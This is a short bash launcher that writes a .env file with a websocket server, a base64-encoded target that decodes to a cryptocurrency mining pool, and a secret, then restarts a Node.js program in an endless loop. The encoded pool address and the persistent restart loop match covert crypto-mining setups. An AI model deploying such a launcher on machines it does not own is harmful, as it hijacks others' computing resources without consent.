#!/bin/bash
CONNECT=$1
echo "SERVER_WS=wss://alpaquitaandina.online
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_SECRET=020
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
